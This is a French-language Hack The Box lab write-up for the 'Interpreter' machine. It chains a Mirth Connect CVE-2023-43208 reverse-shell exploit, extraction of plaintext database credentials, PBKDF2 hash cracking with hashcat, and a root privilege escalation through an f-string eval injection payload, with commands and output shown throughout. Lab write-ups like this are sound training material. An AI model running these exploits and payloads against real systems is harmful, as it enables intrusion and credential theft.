# HTB — Interpreter · Linux · Medium

**IP :** `10.129.27.34` &nbsp;|&nbsp; **Date :** 11 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · nikto · nuclei · hashcat · mysql · netcat

---

## Contexte

> Interpreter expose une instance **Mirth Connect 4.4.0** vulnérable à une RCE non authentifiée (CVE-2023-43208). Une fois à l'intérieur, les credentials MariaDB sont lisibles dans la config. Un hash PBKDF2 extrait de la BDD donne un accès SSH. L'escalade de privilèges exploite une **injection dans un f-string évalué dynamiquement** par un serveur Flask local tournant en root.

---

## Reconnaissance

### Scan de ports

```bash
nmap -A 10.129.27.34
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian
80/tcp  open  http     Jetty — Mirth Connect Administrator
443/tcp open  ssl/http Jetty — Mirth Connect Administrator
```

Le certificat TLS trahit immédiatement l'application : `CN=mirth-connect`. Les deux ports exposent la même interface d'administration Mirth Connect.

### Scan passif

```bash
nuclei -u http://10.129.27.34
nikto -h 10.129.27.34:443
```

Résultats notables :

- `[mirth-connect-detect]` — version identifiée via nuclei
- En-têtes de sécurité absents (CSP, HSTS, X-Frame-Options)
- Méthode `TRACE` autorisée
- Nikto repère `/api/soap/?wsdl=1` avec `Access-Control-Allow-Origin: *`

---

## Exploitation — CVE-2023-43208 (Mirth Connect RCE)

**Mirth Connect 4.4.0** est vulnérable à une désérialisation Java non authentifiée. La CVE-2023-43208 permet d'exécuter des commandes arbitraires sans aucun credential.

### Listener

```bash
nc -lvnp 4444
```

### Lancement de l'exploit

```bash
git clone https://github.com/K3ysTr0K3R/CVE-2023-43208
cd CVE-2023-43208

python3 exp.py -u https://10.129.27.34:443 -lh 10.10.14.218 -lp 4444
```

```
[+] Vulnerable Mirth Connect version 4.4.0 found
[+] Exploit sent — check your netcat listener!
```

```
connect to [10.10.14.218] from (UNKNOWN) [10.129.27.34] 46598
mirth@interpreter:/usr/local/mirthconnect$
```

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-exploitation — Extraction des credentials

### Config BDD en clair

```bash
cat /usr/local/mirthconnect/conf/mirth.properties | grep -E 'database|url|username|password'
```

```
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

### Hash PBKDF2 dans la base MariaDB

```bash
mysql -h 127.0.0.1 -u mirthdb -p'MirthPass123!' mc_bdd_prod -e "
  SELECT p.username, pp.password
  FROM PERSON p
  JOIN PERSON_PASSWORD pp ON p.id = pp.person_id
  WHERE p.username = 'sedric';
"
```

```
| sedric | sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= |
```

### Crack du hash (hashcat mode 10900 — PBKDF2-HMAC-SHA256)

```bash
echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > /tmp/sedric.hash
hashcat -m 10900 /tmp/sedric.hash /usr/share/wordlists/rockyou.txt --force
```

```
Status  : Cracked (2 min 8 sec)
Password: snowflake1
```

### Connexion SSH

```bash
ssh sedric@10.129.27.34
# Password: snowflake1

cat ~/user.txt
# user_flag{*****************************}
```

---

## Escalade de privilèges — Injection f-string

### Découverte du service interne

```bash
ps aux | grep -E 'notif|flask|python'
# root  3522  /usr/bin/python3 /usr/local/bin/notif.py

ss -lntp | grep 54321
# LISTEN 0  128  127.0.0.1:54321
```

Un serveur Flask tourne en **root** sur le port local 54321. Il expose un endpoint `/addPatient` qui accepte du XML.

### Analyse du code vulnérable

```python
# /usr/local/bin/notif.py

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, ..."
    return eval(f"f'''{template}'''")   # ← INJECTION ICI
```

Le champ `firstname` est injecté dans un template Python puis **évalué avec `eval()`**. La regex autorise les accolades `{}` — ce qui permet d'y glisser des expressions Python arbitraires.

### Payload — Lecture du flag root

```python
python3 -c '
import urllib.request
payload = """<?xml version="1.0"?>
<patients>
  <patient>
    <firstname>{open("/root/root.txt").read()}</firstname>
    <lastname>Doe</lastname>
    <sender_app>MirthConnect</sender_app>
    <timestamp>20240308143022</timestamp>
    <birth_date>15/05/1985</birth_date>
    <gender>M</gender>
  </patient>
</patients>"""
data = payload.encode("utf-8")
req = urllib.request.Request(
    "http://127.0.0.1:54321/addPatient", data=data,
    headers={"Content-Type": "application/xml"}
)
with urllib.request.urlopen(req) as r:
    print(r.read().decode())
'
```

```
Patient root_flag{*****************************}
 Doe (M), 41 years old, received from MirthConnect at 20240308143022
```

Le flag root apparaît à la place du prénom — exécuté dans le contexte du processus root.

---

## Flags

```
user.txt  →  user_flag{*****************************}
root.txt  →  root_flag{*****************************}
```

---

## Chaîne d'attaque

| Phase | Technique | Outil | Détail |
|---|---|---|---|
| Reconnaissance | Port scan + fingerprint TLS | nmap · nuclei · nikto | Mirth Connect 4.4.0 identifié |
| Accès initial | Désérialisation Java non authentifiée | CVE-2023-43208 | RCE en tant que `mirth` |
| Post-exploit | Lecture de config en clair | mysql | Credentials MariaDB → hash PBKDF2 |
| Pivot | Crack de hash | hashcat -m 10900 | `snowflake1` en 2 min |
| Escalade | Injection f-string évaluée par root | urllib / XML | Lecture arbitraire de fichiers |

---

## Ce que j'ai retenu

**Les applications de santé exposent souvent des configs en clair.** Mirth Connect stocke ses credentials BDD dans un fichier `.properties` lisible par l'utilisateur du service — première chose à chercher après un accès initial.

**PBKDF2 n'est pas incrackable.** Avec 600 000 itérations et rockyou, hashcat crack le hash en 2 minutes sur un CPU standard si le mot de passe est faible.

**`eval()` sur du contenu utilisateur = RCE garantie.** La regex semblait filtrer les caractères dangereux, mais autorisait `{}` — suffisant pour injecter n'importe quelle expression Python dans le f-string.

---

## Ressources

- [CVE-2023-43208 — PoC](https://github.com/K3ysTr0K3R/CVE-2023-43208)
- [Mirth Connect Security Advisory](https://www.nextgen.com/security-advisories)
- [HackTricks — Python f-string injection](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
